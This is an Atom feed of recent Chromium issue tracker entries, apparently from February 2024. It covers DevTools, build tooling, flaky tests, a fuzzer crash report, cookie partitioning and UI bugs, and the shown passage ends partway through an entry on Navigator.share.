<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://negibokken.github.io/feeds/chromium_issue_tracker/atom.xml</id>
    <title>Chromium issue tracker feed</title>
    <link href="https://negibokken.github.io/feeds/intent_to_ship/atom.xml" rel="self"/>
    <updated>2024-02-23T20:00:58.668Z</updated>
    <entry>
        <id>326629253</id>
        <title>Confusing icons/labels if Chrome is default .pdf handler on Windows 11</title>
        <author>
            <name>ba...@google.com</name>
        </author>
        <link href="https://issues.chromium.org/issues/326629253"/>
        <updated>2024-02-23T20:00:58.668Z</updated>
        <summary>-</summary>
        <content type="html">If you configure Chrome as the default handler for PDF files on Windows 11
- All icons of PDF files are Chrome icons
- The files are described to the user as "Chrome HTML Documents"

Both of these are confusing to users.

Would it be possible to 
- display an icon that suggests that a file is a PDF file
- not call the files not a "Chrome HTML Document" but "PDF Document"?</content>
    </entry>
    <entry>
        <id>326554286</id>
        <title>Debugger.getScriptSource freezes with large scripts</title>
        <author>
            <name>co...@peet.io</name>
        </author>
        <link href="https://issues.chromium.org/issues/326554286"/>
        <updated>2024-02-23T19:50:29.630Z</updated>
        <summary>-</summary>
        <content type="html"># Steps to reproduce the problem
1. Enter this code in your REPL `new Function('\n'.repeat(1024 * 1024 * 10) + 'return 1\n' + '//# sourceURL=big.js'); debugger;`
2. Open big.js from the Sources view, if it is not opened for you
3. Notice it takes an inordinately long time to respond with the script content

# Problem Description
I got an issue in VS Code (https://github.com/microsoft/vscode-js-debug/issues/1948) about freezing when we retrieve a script's source, which is required in order to compute source map renames. I was surprised to see such slow responses on relatively small files, in this case the user's file was only 1.3MB, which should be fast enough to serialize and send over the wire.

# Summary
Debugger.getScriptSource freezes with large scripts

# Additional Data
Category: Developer Tools \
Chrome Channel: Dev \
Regression: N/A</content>
    </entry>
    <entry>
        <id>326578830</id>
        <title>gc-plugin misses the case of std::optional&amp;lt;AnotherTraceable&amp;gt; field in a traceable class</title>
        <author>
            <name>wa...@chromium.org</name>
        </author>
        <link href="https://issues.chromium.org/issues/326578830"/>
        <updated>2024-02-23T19:41:23.497Z</updated>
        <summary>-</summary>
        <content type="html">The following code passes compilation:
```
struct T1 {
  DISALLOW_NEW();
 public:
  void Trace(Visitor* visitor) const { visitor-&gt;Trace(member); }
  Member&lt;LayoutObject&gt; member;
};

struct T2 : GarbageCollected&lt;T2&gt; {
  void Trace(Visitor* visitor) const {}
  // { visitor-&gt;Trace(field); }  This causes compilation error.
  std::optional&lt;T1&gt; field;
};

TEST(X, Y) {
  HeapVector&lt;Member&lt;T2&gt;&gt; h;
}
```
while the `T1::member` through `T2::field` is not traced. Tracing through `std::optional` is not supported, but gc-plugin misses the case.</content>
    </entry>
    <entry>
        <id>326505378</id>
        <title>Interest group bid latency reporting is inconsistent.</title>
        <author>
            <name>mm...@chromium.org</name>
        </author>
        <link href="https://issues.chromium.org/issues/326505378"/>
        <updated>2024-02-23T19:38:15.532Z</updated>
        <summary>-</summary>
        <content type="html">When Private Audience buyer worklets generate a bit, we may run the generateBid() script twice, while enforcing k-anonymity.  When we run the script twice, we report the runtime only a single execution of the script took to scoreAd(), but we report the runtime of both script executions to aggregate reporting.  This seems likely to result in confusion of consumers.  I think it's better to be consistent (I'd say always report the time for either the single execution that generated the bid, or the longer run of the two, to avoid increasing reported times for groups with ads that aren't yet k-anonymous, but we could report their sum instead).</content>
    </entry>
    <entry>
        <id>326584510</id>
        <title>reclient ignores `inputs` on C targets in GN</title>
        <author>
            <name>da...@chromium.org</name>
        </author>
        <link href="https://issues.chromium.org/issues/326584510"/>
        <updated>2024-02-23T19:32:48.599Z</updated>
        <summary>-</summary>
        <content type="html">1. Put a .txt file in `inputs` in an executable target.
2. Try to open that .txt file from a clang plugin

Expected:
The file was uploaded to the RBE backend since it's in inputs

Actual:
The file is not there. Compilation falls back to local.

Since the file is in `inputs` it's in the ninja build graph, and to verify that, editing the file does cause re-compilation of the executable.

```
$ gn desc out_desktop/Release base:base_unittests
Target //base:base_unittests
type: executable
toolchain: //build/toolchain/linux:clang_x64

visibility
  *

metadata
  {

  }

testonly
  true

check_includes
  true

allow_circular_includes_from

sources
  //base/allocator/dispatcher/dispatcher_unittest.cc
  //base/allocator/dispatcher/initializer_unittest.cc
  ...

public
  [All headers listed in the sources are public.]

inputs
  //build/config/unsafe_buffers_paths.txt

...
```
</content>
    </entry>
    <entry>
        <id>326624914</id>
        <title>Detect legacy best revision failure</title>
        <author>
            <name>li...@google.com</name>
        </author>
        <link href="https://issues.chromium.org/issues/326624914"/>
        <updated>2024-02-23T19:29:54.917Z</updated>
        <summary>-</summary>
        <content type="html"></content>
    </entry>
    <entry>
        <id>326509143</id>
        <title>My website keeps saying "did you mean dum-f.uk?"</title>
        <author>
            <name>ne...@gmail.com</name>
        </author>
        <link href="https://issues.chromium.org/issues/326509143"/>
        <updated>2024-02-23T19:17:59.876Z</updated>
        <summary>-</summary>
        <content type="html">I have a website called "dumb-f.uk" and someone else has "dum-f.uk" and my website keeps directing people to "dum-f.uk".</content>
    </entry>
    <entry>
        <id>326606995</id>
        <title>ChromeLite for Home Automation 10.x.x.x 192.16.x.x HTTP browser</title>
        <author>
            <name>de...@gmail.com</name>
        </author>
        <link href="https://issues.chromium.org/issues/326606995"/>
        <updated>2024-02-23T19:17:38.198Z</updated>
        <summary>-</summary>
        <content type="html"># Steps to reproduce the problem
1. https://support.stackpath.com/hc/en-us/articles/360040963152-Chrome-Ending-Support-for-HTTP-requests
2. Chrome blocks access to home automation IoT device that only support HTTP (not HTTPS) requests
3. 

# Problem Description
Most microcontroller devices used in Home Automation and IoT do not have the processing capacity to deal with encrypted (certificate managed) traffic on their web servers.  One of the most common interfaces is to provide a web server on the device and browse to it to get status of make changes. So you browse to turn on a light in your garage. These are usually on local networks (10.x.x.x, 192.168.x.x, 172.16.x.x). These are now being blocked by Chrome. Please write a ChromeLite for local networks that is happy with HTTP traffic. Something like dillo.org but with a Chrome familiar interface and settings. Maybe javascript and HTML5 but "less is better" because you'll not get paid with ads or data mining.

# Summary
ChromeLite for Home Automation 10.x.x.x 192.16.x.x HTTP browser

# Additional Data
Category: Network / Downloading \
Chrome Channel: Not sure \
Regression: Yes</content>
    </entry>
    <entry>
        <id>326621184</id>
        <title>fast/spatial-navigation/snav-container-only-white-space.html test is flaky</title>
        <author>
            <name>sa...@google.com</name>
        </author>
        <link href="https://issues.chromium.org/issues/326621184"/>
        <updated>2024-02-23T19:12:19.477Z</updated>
        <summary>-</summary>
        <content type="html">fast/spatial-navigation/snav-container-only-white-space.html

Harness Failure on Mac11 tests builder

Test History Link:
https://ci.chromium.org/ui/test/chromium%3Aci/ninja%3A%2F%2F%3Ablink_web_tests%2Ffast%2Fspatial-navigation%2Fsnav-container-only-white-space.html?q=VHASH%3A7a1132327b93d186

Dashboard:
https://data.corp.google.com/sites/chrome_generic_flakiness_dashboard_datasite/top_flakes/?f=test_id:eq:ninja:%2F%2F:blink_web_tests%2Ffast%2Fspatial-navigation%2Fsnav-container-only-white-space.html&amp;f=realm:in:(null)&amp;f=variant_test_suite:in:blink_web_tests&amp;can=2

and average 6.47% flaky rate in runs mostly on Mac builders</content>
    </entry>
    <entry>
        <id>326503098</id>
        <title>Fix use of HeapPointersOnStacksScope for blink unittests</title>
        <author>
            <name>ni...@chromium.org</name>
        </author>
        <link href="https://issues.chromium.org/issues/326503098"/>
        <updated>2024-02-23T19:03:15.537Z</updated>
        <summary>-</summary>
        <content type="html">I'm opening this to discuss and possibly resolve the following issue.
It is related to b/40221845.

The current mechanism for running the blink unittest suite first installs a `HeapPointersOnStacksScope` [1] and then attaches a series of isolates [2], one per test. There's also another similar scope installed here [3].

Installing the `HeapPointersOnStacksScope` once per test, after the isolate has been attached, would probably give us a better design for the blink tests and would also simplify the implementation on the V8 side.

I have made a [first attempt](https://crrev.com/c/5318128) towards a fix. It works locally if we temporarily lift the requirement that `HeapPointersOnStacksScope` objects be stack allocated. I'm not sure how to best work around this.

[1]: https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/platform/testing/testing_platform_support.cc;drc=3d5440235c126908af20960a528f90458df91ac8;l=246
[2]: https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/platform/testing/task_environment.cc;drc=82551be317167b59bfe7360eb894d76262ad9e68;l=36
[3]: https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/controller/tests/thread_state_test_environment.h;drc=d2b5c17eff35da6ebff8ba20c99688b87e1bc752;l=36</content>
    </entry>
    <entry>
        <id>326554282</id>
        <title>Require all code review comments are resolved before submission for Chromium</title>
        <author>
            <name>es...@chromium.org</name>
        </author>
        <link href="https://issues.chromium.org/issues/326554282"/>
        <updated>2024-02-23T19:01:58.612Z</updated>
        <summary>-</summary>
        <content type="html">Android switched to disallowing submitting CLs with unresolved comments without issue. We've discussed adding a warning for Chrome because the UX might not be great with CQ, but that comes with maintenance (crbug.com/40258942). If the experience isn't bad, we should consider using the same gerrit-level enforcement.

Here are the `project.config` changes Android made:
```
[submit-requirement "No-Unresolved-Comments"]
  description = Changes that have unresolved comments are not submittable. Unless overridden with "Unresolved-Comment-Reason: &lt;reason&gt;" line in change message.
  overrideIf = message:\"^.*Unresolved-Comment-Reason:.*\"
  applicableIf = has:unresolved
  submittableIf = -has:unresolved
```

Let me start by turning it on for an infra repo first, perhaps `chromium/tools/build`.</content>
    </entry>
    <entry>
        <id>326564991</id>
        <title>No me deja instalar la última versión </title>
        <author>
            <name>aj...@gmail.com</name>
        </author>
        <link href="https://issues.chromium.org/issues/326564991"/>
        <updated>2024-02-23T18:54:54.393Z</updated>
        <summary>-</summary>
        <content type="html"># Steps to reproduce the problem
1. No funciona una apps
2. 
3. 

# Problem Description
No funciona bien 

# Summary
No me deja instalar la última versión 

# Additional Data
Category: Network / Downloading \
Chrome Channel: Not sure \
Regression: N/A</content>
    </entry>
    <entry>
        <id>326554281</id>
        <title>Devtools extension subpanels not discoverable - need a way for extensions to open them</title>
        <author>
            <name>th...@us.ibm.com</name>
        </author>
        <link href="https://issues.chromium.org/issues/326554281"/>
        <updated>2024-02-23T18:53:07.283Z</updated>
        <summary>-</summary>
        <content type="html"># Steps to reproduce the problem
1. For context, see the IBM Equal Access Accessibility Checker (https://chromewebstore.google.com/detail/ibm-equal-access-accessib/lkcagbfjnkomcinoddgooolagloogehp?pli=1)
2. Open the Elements main panel
3. For most users, the extension subpanels are hidden inside the overflow menu

# Problem Description
This has been a significant issue for our users and we have been unable to work around. 

Users are accustomed to looking for extensions as major panels, but they do not think to look for subpanels added to the Elements panel. Our users have no trouble finding our main panel, but rarely discover our Elements subpanel since default sizes and layouts hide the extension subpanels inside an overflow menu. They never find our subpanel unless we manage to have a one-on-one conversation and physically show them. Attempts to educate users through the extension popup and through overlays on the main panel have been unsuccessful since users ignore these types of instructions - they have been trained to ignore them by other extensions that show unnecessary welcome messages.

At one time, when we were a Firebug extension, we were able to open and focus our subpanel programmatically, helping users to find that subpanel. Chrome has never allowed this behavior. From our main panel, we are able to force open the Elements main panel by a call to inspect the element, but we do not have a mechanism to also open up our sidepanel to keep the users in context. Once they know it's there, they have the ability to re-order the tabs themselves, but we haven't been successful in helping them even know to look for it.

I can understand certain limits on forcing open an extension panel. However, if a user is clicking on one extension panel, it seems reasonable to be able to take the user to another panel owned by the same extension.

# Summary
Devtools extension subpanels not discoverable - need a way for extensions to open them

# Additional Data
Category: Developer Tools \
Chrome Channel: Stable \
Regression: N/A</content>
    </entry>
    <entry>
        <id>326618992</id>
        <title>App Menu IPH</title>
        <author>
            <name>an...@google.com</name>
        </author>
        <link href="https://issues.chromium.org/issues/326618992"/>
        <updated>2024-02-23T18:53:05.549Z</updated>
        <summary>-</summary>
        <content type="html">Copy of an internal bug for use with branch merges.</content>
    </entry>
    <entry>
        <id>326619067</id>
        <title>external/wpt/css/css-scroll-snap-2/snapchanging/snapchanging-on-user-root-scroll.tentative.html test is flaky</title>
        <author>
            <name>sa...@google.com</name>
        </author>
        <link href="https://issues.chromium.org/issues/326619067"/>
        <updated>2024-02-23T18:53:02.092Z</updated>
        <summary>-</summary>
        <content type="html">external/wpt/css/css-scroll-snap-2/snapchanging/snapchanging-on-user-root-scroll.tentative.html

Timeout Failure on mac13-arm64-rel-tests builder

Test History Link:
mac13-arm64-rel-tests:
https://ci.chromium.org/ui/test/chromium%3Aci/ninja%3A%2F%2F%3Ablink_wpt_tests%2Fexternal%2Fwpt%2Fcss%2Fcss-scroll-snap-2%2Fsnapchanging%2Fsnapchanging-on-user-root-scroll.tentative.html?q=VHASH%3Ad66f84fc0745c58a

Dashboard:
https://data.corp.google.com/sites/chrome_generic_flakiness_dashboard_datasite/top_flakes/?f=test_id:eq:ninja:%2F%2F:blink_wpt_tests%2Fexternal%2Fwpt%2Fcss%2Fcss-scroll-snap-2%2Fsnapchanging%2Fsnapchanging-on-user-root-scroll.tentative.html&amp;f=realm:in:(null)&amp;f=variant_test_suite:in:blink_wpt_tests&amp;can=2

and average 9.69% flaky rate in runs mostly on Mac builders</content>
    </entry>
    <entry>
        <id>326619066</id>
        <title>Arrow mark is overlapping with Blocking Category</title>
        <author>
            <name>js...@google.com</name>
        </author>
        <link href="https://issues.chromium.org/issues/326619066"/>
        <updated>2024-02-23T18:53:00.181Z</updated>
        <summary>-</summary>
        <content type="html">124.0.6317.0 (Official Build) (64-bit) (cohort: M122 Rollout)
fb9d4487c533dc45ed93977168e10db75dc717e8-refs/branch-heads/6317@{#1}

OS : Win(10,11)

Preconditions:
None

Steps to reproduce:

1.Launch Chrome and Open NTP
2.Inspect it
3.Go to Event Listeners tab
4.Click On "All"
5. Select "Blocking"
6.Observe that, Arrow mark is overlapping with Blocking category


Actual Result:Arrow mark is overlapping with Blocking Category
Expected Result: The arrow mark should not overlap with Blocking Category

This is a regression issue broken in M124, and please find the per-revision bisect info below:

Good Build:124.0.6316.0
Bad Build:124.0.6317.0

Change Log: 
https://chromium.googlesource.com/chromium/src.git/+log/be8cd7c4b1c3093d0722a45c198c3e6872b217b7..64a22dee8d3180a73913a234898779f5d96755bd?n=1000&amp;pretty=fuller


We are unable to find the culprit from the above Change log, please help us in assigning it to the right owner.

Please find attached screenshots below:


Notes:
1)This issue unable to repro on Stable #122.0.6261.72, Beta #122.0.6261.6,Dev RC#123.0.6272.2



Thanks..!!</content>
    </entry>
    <entry>
        <id>326509142</id>
        <title>Clicks and keyboard interactions randomly stop working on a page</title>
        <author>
            <name>ma...@chromium.org</name>
        </author>
        <link href="https://issues.chromium.org/issues/326509142"/>
        <updated>2024-02-23T18:48:30.725Z</updated>
        <summary>-</summary>
        <content type="html">I don't have a reliable repro for this behavior, but I've been observing it for around 2 weeks now. I run the Dev channel, on a Mac M1. So that's currently 123.0.6300.3.

I see it quite often on chromium code search (https://source.chromium.org/search?q=foobar&amp;sq=&amp;ss=chromium%2Fchromium%2Fsrc), but that's likely just because I spend a lot of time there. I believe I've seen it elsewhere also.

The behavior is:

1. Navigate to a new page
2. Immediately after the load, or at least very shortly thereafter, I am unable to interact with the page. It is rendered correctly, and seems to update correctly if resized for example. But no clicks are registered, the keyboard (e.g. Tab key) does not do anything, and the page appears frozen.
3. It is possible (I haven't verified) that after a very long delay (&gt;1 minute) it registers clicks again.
4. Reloading the "broken" page does *not* seem to fix it.
5. Copy/pasting the URL to a fresh tab usually gives a fully working page.

I wish I had a better repro for you. But it definitely seems bad, so I wanted to report it asap. If I get a better repro or if it happens on another site, I'll update this bug.</content>
    </entry>
    <entry>
        <id>326517412</id>
        <title>webnn_graph_mojolpm_fuzzer: CHECK failure: input_iterator != id_to_layer_input_info_map_.end() in graph_builder.cc</title>
        <author>
            <name>24...@project.gserviceaccount.com</name>
        </author>
        <link href="https://issues.chromium.org/issues/326517412"/>
        <updated>2024-02-23T18:46:28.853Z</updated>
        <summary>-</summary>
        <content type="html">Detailed Report: https://clusterfuzz.com/testcase?key=5459047026720768

Fuzzing Engine: libFuzzer
Fuzz Target: webnn_graph_mojolpm_fuzzer
Job Type: windows_libfuzzer_chrome_asan
Platform Id: windows

Crash Type: CHECK failure
Crash Address: 
Crash State:
  input_iterator != id_to_layer_input_info_map_.end() in graph_builder.cc
  logging::CheckLogMessage::~CheckLogMessage
  webnn::coreml::GraphBuilder::GetOperandInfo
  
Sanitizer: address (ASAN)

Regressed: https://clusterfuzz.com/revisions?job=windows_libfuzzer_chrome_asan&amp;range=1258912:1258913

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5459047026720768

Issue filed automatically.

See https://chromium.googlesource.com/chromium/src/+/master/testing/libfuzzer/reproducing.md for instructions on reproducing this bug locally.</content>
    </entry>
    <entry>
        <id>326617506</id>
        <title>"Missing IPA files for early stable and Beta iOS " test case coverage needed in Earl Grey or unittests for issue 325215897</title>
        <author>
            <name>ie...@google.com</name>
        </author>
        <link href="https://issues.chromium.org/issues/326617506"/>
        <updated>2024-02-23T18:42:47.883Z</updated>
        <summary>-</summary>
        <content type="html">morawand@, do we have automation coverage for this bug to prevent future regressions?

Requesting you to provide the automation status / tests links.</content>
    </entry>
    <entry>
        <id>326615836</id>
        <title>Missing "settings" text in https://www.google.com/chrome/whats-new/m123/</title>
        <author>
            <name>xu...@google.com</name>
        </author>
        <link href="https://issues.chromium.org/issues/326615836"/>
        <updated>2024-02-23T18:30:36.076Z</updated>
        <summary>-</summary>
        <content type="html">Currently step 1 of each module says "In , turn on", we are missing the "settings" text (not link) after "In".

https://www.google.com/chrome/whats-new/m123/</content>
    </entry>
    <entry>
        <id>326509140</id>
        <title>Restore bot name on build pages</title>
        <author>
            <name>bp...@chromium.org</name>
        </author>
        <link href="https://issues.chromium.org/issues/326509140"/>
        <updated>2024-02-23T18:19:26.890Z</updated>
        <summary>-</summary>
        <content type="html">eg: https://screenshot.googleplex.com/4nNQ2tyMNr3s3p7  
That build on dev lacks the name of the bot that ran the build.  

But on prod, the name is displayed on the build page:  
https://screenshot.googleplex.com/3JMLgBVWp8FArUV

The name is being removed due to some buildbucket migration. And consequently it would take an extra click + an extra tab to view the bot name by clicking into the task link.

However, troopers and folks on chrome-infra pretty often need to determine the bot name that ran a set of builds. eg: It was checked in a number of builds across https://issues.chromium.org/issues/326288628#comment9. It was also checked multiple times in several sets of builds in https://crbug.com/41490921. And there are many more instances where this is done.

Adding an extra click &amp; tab into that flow would make that process more difficult. So please restore the bot name.</content>
    </entry>
    <entry>
        <id>326610082</id>
        <title>Add structured return object to Serialize and deserialize methods for net::CookiePartitionKey</title>
        <author>
            <name>se...@google.com</name>
        </author>
        <link href="https://issues.chromium.org/issues/326610082"/>
        <updated>2024-02-23T18:18:46.332Z</updated>
        <summary>-</summary>
        <content type="html">Change net::CookiePartitionKey::Serialize (and deserialize) to have a structured return object from the current implementation that just returns a string.</content>
    </entry>
    <entry>
        <id>326578828</id>
        <title>Restore buildername + buildnumber to task names</title>
        <author>
            <name>bp...@chromium.org</name>
        </author>
        <link href="https://issues.chromium.org/issues/326578828"/>
        <updated>2024-02-23T18:11:02.343Z</updated>
        <summary>-</summary>
        <content type="html">eg: https://screenshot.googleplex.com/8MVcYVzP2Az5bfq   
That's a bot on chromium-swarm that runs builds. You can see in its task history the names of the builders it ran builds for, and their buildnumbers.

But on dev, the task names are much less helpful: https://screenshot.googleplex.com/3ZFrhmZAbnwpRcn  
If this is something that's going to get rolled to prod, please restore buildername + buildnumber to the task names. It's helpful when viewing a bot that runs builds for multiple builders to see what builds it's recently picked up.
</content>
    </entry>
    <entry>
        <id>326611791</id>
        <title>dPWA Universal Install</title>
        <author>
            <name>dm...@google.com</name>
        </author>
        <link href="https://issues.chromium.org/issues/326611791"/>
        <updated>2024-02-23T18:03:03.329Z</updated>
        <summary>-</summary>
        <content type="html">Tracking bug for universal install feature.</content>
    </entry>
    <entry>
        <id>326610902</id>
        <title>overscroll-behavior is not trapping page navigation gestures on ChromeOS</title>
        <author>
            <name>ar...@google.com</name>
        </author>
        <link href="https://issues.chromium.org/issues/326610902"/>
        <updated>2024-02-23T18:00:31.257Z</updated>
        <summary>-</summary>
        <content type="html">Visit https://gui-challenges.web.app/carousel/dist/ from a ChromeOS device and swipe "towards left" on the first carousel.

What's happening?
the swipe to go back gesture is triggered and will make you leave the page

What should happen?
the swipe should be contained within the carousel and not trigger a back navigation</content>
    </entry>
    <entry>
        <id>326526721</id>
        <title>Should FirstPartySetsDatabase check validity of StatementRef objects returned by Database::GetCachedStatement()?</title>
        <author>
            <name>dm...@chromium.org</name>
        </author>
        <link href="https://issues.chromium.org/issues/326526721"/>
        <updated>2024-02-23T17:55:38.388Z</updated>
        <summary>-</summary>
        <content type="html">Context: https://chromium-review.googlesource.com/c/chromium/src/+/5314328/comment/58e6c6e5_08dc37d7/
&gt; &gt; dmcardle:
&gt; &gt; (While poking around this code, I just noticed that FirstPartySetsDatabase is not checking the truthiness of the StatementRef returned by GetCachedStatement().)
&gt;
&gt; cfredric: 
&gt; We should definitely make sure we're checking all the return values from the //sql interfaces! The fallible methods should ideally be marked [[nodiscard]] to force us to do the right thing. But IIUC, GetCachedStatement doesn't look fallible, so I think what we're currently doing is fine?

Database::GetCachedStatement()'s [documentation](https://source.chromium.org/chromium/chromium/src/+/main:sql/database.h;l=576-579;drc=f4a00cc248dd2dc8ec8759fb51620d47b5114090) says:
```
  // If the |sql| has an error, an invalid, inert StatementRef is returned (and
  // the code will crash in debug). The caller must deal with this eventuality,
  // either by checking validity of the |sql| before calling, by correctly
  // handling the return of an inert statement, or both.
```

On first read, I'm not exactly sure what "has an error" means relative to the `sql` string parameter, and whether it can be determined by us at compile time. It certainly includes syntax errors, but does it also include, for instance, referencing a column that does not exist in the db? Other stateful things that SQLite could consider to be an error?

In the face of disk corruption, I think it's plausible that the schema could lose a column, meaning we'd get an invalid StatementRef and crash on a nullptr dereference when we attempt to use it. Based on this [test](https://source.chromium.org/chromium/chromium/src/+/main:sql/database_unittest.cc;l=649-651;drc=f4a00cc248dd2dc8ec8759fb51620d47b5114090), referencing a missing column is an error when compiling a SQL statement.

This scenario I've concocted is probably pretty rare, but I think it's worth handling the edge case. According to the chromium C++ style guide, we should recover gracefully from disk corruption: &lt;https://chromium.googlesource.com/chromium/src/+/main/styleguide/c++/checks.md&gt;.

**Aside:** Digging into the implementation of GetCachedStatement(), it also cares whether Database::db_ is non-null *and* inherits errors from [sqlite3_prepare_v3()](https://www.sqlite.org/c3ref/prepare.html). The SQLite doc doesn't say too much, but it explicitly cares whether the database has been closed. As long as we bubble errors up properly as discussed in https://crrev.com/c/5314328, I don't think we need to worry whether the db is open.

I see 10 calls to Database::GetCachedStatement() in FirstPartySetsDatabase [[cs]].

[cs]: https://source.chromium.org/search?q=file:first_party_sets_database%20GetCachedStatement&amp;sq=&amp;ss=chromium%2Fchromium%2Fsrc

</content>
    </entry>
    <entry>
        <id>326509139</id>
        <title>MediaRecorder with getDisplayMedia sometimes produces black bar on the right side of video recording</title>
        <author>
            <name>tr...@switchboard.app</name>
        </author>
        <link href="https://issues.chromium.org/issues/326509139"/>
        <updated>2024-02-23T17:41:56.417Z</updated>
        <summary>-</summary>
        <content type="html"># Steps to reproduce the problem
1. Resize browser window to different aspect ratios.
2. Capture a display stream with getDisplayMedia with the following options. 
{
    "audio": {
        "autoGainControl": true,
        "noiseSuppression": false,
        "echoCancellation": false
    },
    "video": {
        "aspectRatio": {},
        "height": {},
        "width": {},
        "frameRate": {
            "ideal": 30
        }
    },
    "preferCurrentTab": true,
    "selfBrowserSurface": "include"
}
3. Note that sometimes in the resulting recording there's a 1px black bar on the right side of the video. 

# Problem Description
There's a 1px black bar on the right side of the video.

# Summary
MediaRecorder with getDisplayMedia sometimes produces black bar on the right side of video recording

# Custom Questions
#### Which component does this fall under?
Blink&gt;MediaStream

#### Does this feature work correctly in other browsers?
No - I can reproduce the problem in another browser

#### Details of interop issue
undefined

# Additional Data
Category: API \
Chrome Channel: Stable \
Regression: N/A</content>
    </entry>
    <entry>
        <id>326505377</id>
        <title>Reduce overhead of Api callbacks</title>
        <author>
            <name>is...@chromium.org</name>
        </author>
        <link href="https://issues.chromium.org/issues/326505377"/>
        <updated>2024-02-23T17:34:07.024Z</updated>
        <summary>-</summary>
        <content type="html">This is a tracking bug for various improvements related to Api function calls.

The number of instructions executed for each Api callback call can be reduced by restructuring objects involved:
 - CallHandlerInfo can be "inlined" into FunctionTemplateInfo (one indirection less, simplify support of side-effect checking for Api callbacks),
 - v8::FunctionCallbackInfo doesn't actually require Holder value:
   - the callback knows whether receiver is a JSGlobalObject and thus it can load hidden prototype itself,
   - OR
   - we could make Blink store pointers to Window in WindowProxy on Blink side and thus avoid the need to ever access the hidden prototype via V8 Api,
 - v8::FunctionCallbackInfo can be made variable-size (new.target value is not necessary for regular calls),
 - v8::FunctionCallbackInfo structure can be better integrated with ApiCallbackExitFrame which could avoid data duplication on the stack and avoid one level of indirection when accessing the data.
</content>
    </entry>
    <entry>
        <id>326605834</id>
        <title>After the ancestor chain bit changes are finalized, update the serialization/deserialization calls sites that need it</title>
        <author>
            <name>se...@google.com</name>
        </author>
        <link href="https://issues.chromium.org/issues/326605834"/>
        <updated>2024-02-23T17:32:47.685Z</updated>
        <summary>-</summary>
        <content type="html">Adding the ancestor chain bit is going to change the serialization/deserialization of the cookie partition key. After the ancestor chain bit changes are finalized, update the serialization/deserialization calls sites that need it and ensure that the correct values are being used.</content>
    </entry>
    <entry>
        <id>326513538</id>
        <title>[Graphics]: 1 regressions in rendering.desktop</title>
        <author>
            <name>ch...@appspot.gserviceaccount.com</name>
        </author>
        <link href="https://issues.chromium.org/issues/326513538"/>
        <updated>2024-02-23T17:31:05.062Z</updated>
        <summary>-</summary>
        <content type="html">All graphs for this regression group at 1260787:1262137:

  Internal (Googlers-only) Reports:
    - Chromium: https://chrome-perf.corp.goog/_/alertgroup?group_id=bdfa87b7-b911-43da-bbba-ced197394342

  Public Reports:
    - Chromium: https://perf.luci.app/_/alertgroup?group_id=bdfa87b7-b911-43da-bbba-ced197394342
  (Legacy) Chromeperf Report: https://chromeperf.appspot.com/group_report?group_id=bdfa87b7-b911-43da-bbba-ced197394342

Top 1 regressions (out of 1, with 0 improvements) in this group:
  - ChromiumPerf/win-10-perf/rendering.desktop/thread_total_rendering_cpu_time_per_frame/filter_terrain_svg
      565.14%: 3.3088 -&gt; 22.008 unitless

Top 1 affected measurements in win-10-perf:
  - rendering.desktop/thread_total_rendering_cpu_time_per_frame/filter_terrain_svg
      565.14%: 3.3088 -&gt; 22.008 unitless

Regressions grouped by rendering.desktop includes data from the following benchmarks with listed owners:
  rendering.desktop: chrome-gpu-metrics@google.com, jonross@chromium.org
      

Commits in this range:
  Chromium Commit Position: https://crrev.com/1260786..1262137
  V8 Commit Position: https://chromium.googlesource.com/v8/v8/+log/08294ff5efd6e8902f1988d405fa9501e496ee8d..b022215b896bec8bd80238b5dc321f9cce970bdd
  WebRTC Git Hash: https://webrtc.googlesource.com/src/+log/23c32da48ae3f5f146dbd60b8b7fe4416f3750b4..600503ae26ae8bd4aed4dc85e39f0b3ba34d36dc</content>
    </entry>
    <entry>
        <id>326505376</id>
        <title>Renderer crash when DigitalCredentialRequestOptions::providers is empty</title>
        <author>
            <name>pk...@chromium.org</name>
        </author>
        <link href="https://issues.chromium.org/issues/326505376"/>
        <updated>2024-02-23T17:28:19.438Z</updated>
        <summary>-</summary>
        <content type="html"></content>
    </entry>
    <entry>
        <id>326507612</id>
        <title>Add an end milestone to the MutationEventsEnabled enterprise policy</title>
        <author>
            <name>ma...@chromium.org</name>
        </author>
        <link href="https://issues.chromium.org/issues/326507612"/>
        <updated>2024-02-23T17:23:45.525Z</updated>
        <summary>-</summary>
        <content type="html">See this file:

https://source.chromium.org/chromium/chromium/src/+/main:components/policy/resources/templates/policy_definitions/Miscellaneous/MutationEventsEnabled.yaml;l=23;drc=79c7876d142eb9db9af26f2ff15fa3af848f0632

All four supported_on lines should be end-dated with 134, once 134 has branched, on Jan 27, 2025.</content>
    </entry>
    <entry>
        <id>326602673</id>
        <title>Hot Key to Swap to Previous Tab Does not work with Saved Tab Groups + Pinned</title>
        <author>
            <name>ho...@google.com</name>
        </author>
        <link href="https://issues.chromium.org/issues/326602673"/>
        <updated>2024-02-23T17:21:59.878Z</updated>
        <summary>-</summary>
        <content type="html"># Steps to reproduce the problem
1. Make a pinned tab
2.  Make a saved tab group
3. Open a new tab outside of the group
3. Try to swap back to the saved tab group (alt+q) (i have my alt and cntrl swapped in key bindings as fyi).  
4.  Nothing happens.  Hit it again and then focus moves to the pinned tab

# Problem Description
Hot Key to Swap to Previous Tab Does not work with Saved Tab Groups + Pinned

# Summary
Hot Key to Swap to Previous Tab Does not work with Saved Tab Groups + Pinned

# Additional Data
Category: UI \
Chrome Channel: Stable \
Regression: N/A</content>
    </entry>
    <entry>
        <id>326606987</id>
        <title>Chrome for Testing uses Chromium policy path on Mac instead CfT specific one</title>
        <author>
            <name>kv...@chromium.org</name>
        </author>
        <link href="https://issues.chromium.org/issues/326606987"/>
        <updated>2024-02-23T17:20:30.637Z</updated>
        <summary>-</summary>
        <content type="html">https://crrev.com/c/5008236 introduced Chrome for Testing specific policy path that is different from both Chrome and Chromium, however, that change only affects Linux build while the Mac CfT build still uses Chromium policy path in registry.</content>
    </entry>
    <entry>
        <id>326490773</id>
        <title>Navigator.share for USDZ files behaves inconsistenly/incorrect</title>
        <author>
            <name>fe...@gmail.com</name>
        </author>
        <link href="https://issues.chromium.org/issues/326490773"/>
        <updated>2024-02-23T17:08:35.358Z</updated>
        <summary>-</summary>
        <content type="html"># Steps to reproduce the problem
On all OSs: sharing URLs works fine as long as it's absolute URLs. Blob URLs behave the same as files.
